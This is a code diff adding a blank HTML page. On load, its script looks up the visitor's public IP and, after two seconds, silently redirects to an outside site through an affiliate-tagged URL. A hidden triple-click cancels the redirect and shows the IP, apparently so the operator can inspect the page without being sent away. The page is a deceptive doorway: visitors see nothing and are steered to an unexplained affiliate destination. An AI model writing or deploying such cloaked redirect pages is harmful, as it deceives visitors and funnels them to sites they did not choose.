@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background: #ffffff;
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+      cursor: default;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+    #ip-display {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-family: Arial, sans-serif;
+      font-size: 18px;
+      color: #333;
+      background: rgba(255, 255, 255, 0.95);
+      padding: 20px 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      z-index: 9999;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="ip-display"></div>
+
+  <script>
+    let clickCount = 0;
+    let userIP = "Detecting...";
+    let redirected = false;
+    let redirectTimer;
+
+    // Get public IP
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        userIP = data.ip;
+      } catch (e) {
+        userIP = "Unable to detect IP";
+      }
+    }
+
+    // Start IP detection immediately
+    getIP();
+
+    // Triple click detection
+    document.body.addEventListener("click", function () {
+      if (redirected) return;
+
+      clickCount++;
+
+      if (clickCount >= 3) {
+        // Cancel the redirect
+        clearTimeout(redirectTimer);
+
+        // Show the IP
+        const display = document.getElementById("ip-display");
+        display.textContent = "Latest IP: " + userIP;
+        display.style.display = "block";
+      }
+    });
+
+    // Auto redirect after 2 seconds
+    redirectTimer = setTimeout(function () {
+      if (clickCount < 3) {
+        redirected = true;
+        window.location.href = "https://www.th89.fun/m/home?affiliateCode=exoad01&cid=wqsjri1jf9qpec6ljgmo3kfg";
+      }
+    }, 2000);
+  </script>
+
+</body>
+</html>
